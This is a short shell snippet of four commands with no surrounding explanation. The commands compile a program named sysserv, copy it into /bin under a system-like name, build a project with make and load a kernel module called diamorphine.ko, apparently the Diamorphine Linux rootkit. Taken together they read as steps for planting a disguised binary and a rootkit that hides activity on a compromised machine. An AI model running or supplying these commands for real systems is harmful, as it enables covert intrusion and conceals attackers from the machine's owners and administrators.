gcc sysserv.c -o sysserv
cp ./sysserv /bin/sysserv
make
insmod diamorphine.ko
